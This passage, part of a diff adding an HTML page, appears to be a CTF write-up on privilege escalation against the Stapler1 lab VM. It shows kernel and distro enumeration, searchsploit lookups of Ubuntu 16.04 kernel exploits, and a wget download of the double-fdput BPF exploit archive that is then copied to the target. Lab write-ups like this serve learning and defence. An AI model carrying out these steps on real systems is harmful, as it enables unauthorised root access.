+                [+]&nbsp;Data&nbsp;Sent:&nbsp;7.636&nbsp;KB<br>
+                [+]&nbsp;Data&nbsp;Received:&nbsp;17.811&nbsp;KB<br>
+                [+]&nbsp;Memory&nbsp;used:&nbsp;104.129&nbsp;MB<br>
+                [+]&nbsp;Elapsed&nbsp;time:&nbsp;00:00:01</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>Privilege Escalation</strong></h2><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>Rabbit hole #4 - kernel exploit</strong></h3><br>
+        I got the kernel and distro information...<br>
+            <div class="codebox">
+                SHayslett@red<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>*-release<br>
+                <span style="color:#7f0044;font-weight:400">DISTRIB_ID</span>=Ubuntu<br>
+                <span style="color:#7f0044;font-weight:400">DISTRIB_RELEASE</span>=16.04<br>
+                <span style="color:#7f0044;font-weight:400">DISTRIB_CODENAME</span>=xenial<br>
+                <span style="color:#7f0044;font-weight:400">DISTRIB_DESCRIPTION</span>=<span style="color:#3ad900;font-weight:400">"Ubuntu&nbsp;16.04&nbsp;LTS"</span><br>
+                <span style="color:#7f0044;font-weight:400">NAME</span>=<span style="color:#3ad900;font-weight:400">"Ubuntu"</span><br>
+                <span style="color:#7f0044;font-weight:400">VERSION</span>=<span style="color:#3ad900;font-weight:400">"16.04&nbsp;LTS&nbsp;(Xenial&nbsp;Xerus)"</span><br>
+                <span style="color:#7f0044;font-weight:400">ID</span>=ubuntu<br>
+                <span style="color:#7f0044;font-weight:400">ID_LIKE</span>=debian<br>
+                <span style="color:#7f0044;font-weight:400">PRETTY_NAME</span>=<span style="color:#3ad900;font-weight:400">"Ubuntu&nbsp;16.04&nbsp;LTS"</span><br>
+                <span style="color:#7f0044;font-weight:400">VERSION_ID</span>=<span style="color:#3ad900;font-weight:400">"16.04"</span><br>
+                <span style="color:#7f0044;font-weight:400">HOME_URL</span>=<span style="color:#3ad900;font-weight:400">"http://www.ubuntu.com/"</span><br>
+                <span style="color:#7f0044;font-weight:400">SUPPORT_URL</span>=<span style="color:#3ad900;font-weight:400">"http://help.ubuntu.com/"</span><br>
+                <span style="color:#7f0044;font-weight:400">BUG_REPORT_URL</span>=<span style="color:#3ad900;font-weight:400">"http://bugs.launchpad.net/ubuntu/"</span><br>
+                <span style="color:#7f0044;font-weight:400">UBUNTU_CODENAME</span>=xenial<br>
+                <br>
+                SHayslett@red<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">uname</span>&nbsp;-mrs<br>
+                Linux&nbsp;4.4.0-21-generic&nbsp;i686
+            </div>
+        </div><br>
+        <br>
+        And had a look for exploits.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;searchsploit&nbsp;linux&nbsp;kernel&nbsp;4.4.0&nbsp;Ubuntu&nbsp;16.04<br>
+                -------------------------------------------------------------&nbsp;<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                -------------------------------------------------------------&nbsp;<br>
+                Linux&nbsp;Kernel&nbsp;4.4.0&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;14.04<span style="color:#ff9d00;font-weight:700">/</span>16.04&nbsp;x86-64<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'AF_PACKET'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux_x86-64<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>40871.c<br>
+                Linux&nbsp;Kernel&nbsp;4.4.0-21&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;16.04&nbsp;x64<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;Netfilter&nbsp;target_&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux_x86-64<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>40049.c<br>
+                Linux&nbsp;Kernel&nbsp;&lt;&nbsp;4.4.0-116&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;16.04.4<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;Local&nbsp;Privilege&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>44298.c<br>
+                Linux&nbsp;Kernel&nbsp;&lt;&nbsp;4.4.0-21&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;16.04&nbsp;x64<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'netfilter&nbsp;targ&nbsp;|&nbsp;exploits/linux/local/44300.c<br>
+                Linux&nbsp;Kernel&nbsp;&lt;&nbsp;4.4.0-83&nbsp;/&nbsp;&lt;&nbsp;4.8.0-58&nbsp;(Ubuntu&nbsp;14.04/16.04)&nbsp;-&nbsp;&nbsp;|&nbsp;exploits/linux/local/43418.c<br>
+                -------------------------------------------------------------&nbsp;----------------------------------------</span>
+            </div>
+        </div><br>
+        <br>
+        (I know these are x64 exploits and stapler is sn x86 machine, but I was running out of ideas)<br>
+        I tried 44300 but it wouldn't compile - <a href="https://www.exploit-db.com/exploits/44300">https://www.exploit-db.com/exploits/44300</a><br>
+        As well as 40049 but no dice - <a href="https://www.exploit-db.com/exploits/40049">https://www.exploit-db.com/exploits/40049</a><br>
+        And 40871 - <a href="https://www.exploit-db.com/exploits/40871">https://www.exploit-db.com/exploits/40871</a><br>
+        And last 44298 - <a href="https://www.exploit-db.com/exploits/44298">https://www.exploit-db.com/exploits/44298</a><br>
+        <br>
+        The mistake I made is only trying exploits for Kernel version 4.4.0<br>
+        I need to trust my info (that the machine is x86) and relax the precision when searching for exploits.<br>
+        <code>searchsploit linux kernel 4.4 Ubuntu 16.04</code> returns the exploit I actually need - double-fdput()<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;searchsploit&nbsp;linux&nbsp;kernel&nbsp;4.4&nbsp;Ubuntu&nbsp;16.04<br>
+                -------------------------------------------------------------&nbsp;<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                -------------------------------------------------------------&nbsp;<br>
+                Linux&nbsp;Kernel&nbsp;4.4&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;16.04<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'BPF'</span>&nbsp;Local&nbsp;Privilege&nbsp;Esca&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>40759.rb<br>
+                Linux&nbsp;Kernel&nbsp;4.4&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;16.04<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;snd_timer_user_ccallback<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>dos<span style="color:#ff9d00;font-weight:700">/</span>46529.c<br>
+                Linux&nbsp;Kernel&nbsp;4.4.0&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;14.04<span style="color:#ff9d00;font-weight:700">/</span>16.04&nbsp;x86-64<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'AF_PACKET'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux_x86-64<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>40871.c<br>
+                Linux&nbsp;Kernel&nbsp;4.4.0-21&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;16.04&nbsp;x64<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;Netfilter&nbsp;target_&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux_x86-64<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>40049.c<br>
+                Linux&nbsp;Kernel&nbsp;4.4.x&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;16.04<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'double-fdput()'</span>&nbsp;bpf<span style="color:#ff9d00;font-weight:700">(</span>BPF&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>39772.txt<br>
+                Linux&nbsp;Kernel&nbsp;&lt;&nbsp;4.4.0-116&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;16.04.4<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;Local&nbsp;Privilege&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>44298.c<br>
+                Linux&nbsp;Kernel&nbsp;&lt;&nbsp;4.4.0-21&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;16.04&nbsp;x64<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'netfilter&nbsp;targ&nbsp;|&nbsp;exploits/linux/local/44300.c<br>
+                Linux&nbsp;Kernel&nbsp;&lt;&nbsp;4.4.0-83&nbsp;/&nbsp;&lt;&nbsp;4.8.0-58&nbsp;(Ubuntu&nbsp;14.04/16.04)&nbsp;-&nbsp;&nbsp;|&nbsp;exploits/linux/local/43418.c<br>
+                -------------------------------------------------------------&nbsp;----------------------------------------</span>
+            </div>
+        </div><br>
+        <br>
+        I got this by looking at the powerpoint written by the creators of the vm. I went throught it to find out where I'd gone wrong. Download the exploit and copy it over...<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>offensive-security<span style="color:#ff9d00;font-weight:700">/</span>exploitdb-bin-sploits<span style="color:#ff9d00;font-weight:700">/</span>raw<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>bin-sploits<span style="color:#ff9d00;font-weight:700">/</span>39772.zip<br>
+                --2019-04-15&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>14<span style="color:#ff9d00;font-weight:700">:</span>04--&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>offensive-security<span style="color:#ff9d00;font-weight:700">/</span>exploitdb-bin-sploits<span style="color:#ff9d00;font-weight:700">/</span>raw<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>bin-sploits<span style="color:#ff9d00;font-weight:700">/</span>39772.zip<br>
+                Resolving&nbsp;github.com&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>github.com<span style="color:#ff9d00;font-weight:700">)</span>...&nbsp;192.30.253.112,&nbsp;192.30.253.113<br>
+                Connecting&nbsp;to&nbsp;github.com&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>github.com<span style="color:#ff9d00;font-weight:700">)|</span>192.30.253.112<span style="color:#ff9d00;font-weight:700">|:</span>443...&nbsp;connected.<br>
+                HTTP&nbsp;request&nbsp;sent,&nbsp;awaiting&nbsp;response...&nbsp;302&nbsp;Found<br>
+                Location<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>offensive-security<span style="color:#ff9d00;font-weight:700">/</span>exploitdb-bin-sploits<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>bin-sploits<span style="color:#ff9d00;font-weight:700">/</span>39772.zip&nbsp;[following]<br>
+                --2019-04-15&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>14<span style="color:#ff9d00;font-weight:700">:</span>04--&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>offensive-security<span style="color:#ff9d00;font-weight:700">/</span>exploitdb-bin-sploits<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>bin-sploits<span style="color:#ff9d00;font-weight:700">/</span>39772.zip<br>
+                Resolving&nbsp;raw.githubusercontent.com&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">)</span>...&nbsp;151.101.16.133<br>
+                Connecting&nbsp;to&nbsp;raw.githubusercontent.com&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">)|</span>151.101.16.133<span style="color:#ff9d00;font-weight:700">|:</span>443...&nbsp;connected.<br>
+                HTTP&nbsp;request&nbsp;sent,&nbsp;awaiting&nbsp;response...&nbsp;200&nbsp;OK<br>
+                Length<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;7025&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>6.9K<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[application<span style="color:#ff9d00;font-weight:700">/zip</span>]<br>
+                Saving&nbsp;to<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;‘39772.zip’<br>
+                <br>
+                39772.zip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%[===================================&gt;]&nbsp;&nbsp;&nbsp;6.86K&nbsp;&nbsp;--.-KB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;0s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                2019-04-15&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>14<span style="color:#ff9d00;font-weight:700">:</span>05&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>59.8&nbsp;MB<span style="color:#ff9d00;font-weight:700">/</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;‘39772.zip’&nbsp;saved&nbsp;[7025<span style="color:#ff9d00;font-weight:700">/</span>7025]<br>
+                <br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:700">unzip</span>&nbsp;39772.zip&nbsp;<br>
+                Archive<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;39772.zip<br>
+                &nbsp;&nbsp;&nbsp;creating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;39772<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;inflating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;39772<span style="color:#ff9d00;font-weight:700">/</span>.DS_Store&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;creating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;__MACOSX<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;&nbsp;creating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;__MACOSX<span style="color:#ff9d00;font-weight:700">/</span>39772<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;inflating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;__MACOSX<span style="color:#ff9d00;font-weight:700">/</span>39772<span style="color:#ff9d00;font-weight:700">/</span>._.DS_Store&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;39772<span style="color:#ff9d00;font-weight:700">/</span>crasher.tar&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;__MACOSX<span style="color:#ff9d00;font-weight:700">/</span>39772<span style="color:#ff9d00;font-weight:700">/</span>._crasher.tar&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;39772<span style="color:#ff9d00;font-weight:700">/</span>exploit.tar&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;__MACOSX<span style="color:#ff9d00;font-weight:700">/</span>39772<span style="color:#ff9d00;font-weight:700">/</span>._exploit.tar&nbsp;&nbsp;<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;39772<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>39772#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                crasher.tar&nbsp;&nbsp;exploit.tar<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>39772#&nbsp;<span style="color:#ff9d00;font-weight:700">tar</span>&nbsp;-xf&nbsp;exploit.tar&nbsp;<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>39772#&nbsp;<span style="color:#ff9d00;font-weight:700">scp</span>&nbsp;-r&nbsp;ebpf_mapfd_doubleput_exploit&nbsp;SHayslett@192.168.1.237<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>SHayslett<span style="color:#ff9d00;font-weight:700">/</span><br>
+                -----------------------------------------------------------------<br>
+                ~&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Barry,&nbsp;don<span style="color:#3ad900;font-weight:400">'t&nbsp;forget&nbsp;to&nbsp;put&nbsp;a&nbsp;message&nbsp;here&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~<br>
+                -----------------------------------------------------------------<br>
+                SHayslett@192.168.1.237'</span>s&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                suidhelper.c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;255&nbsp;&nbsp;&nbsp;726.5KB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                suidhelper&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;&nbsp;15KB&nbsp;&nbsp;14.4MB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                compile.sh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;155&nbsp;&nbsp;&nbsp;509.8KB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                doubleput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;&nbsp;16KB&nbsp;&nbsp;16.2MB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                hello.c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;2186&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.7MB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;&nbsp;&nbsp;&nbsp;<br>
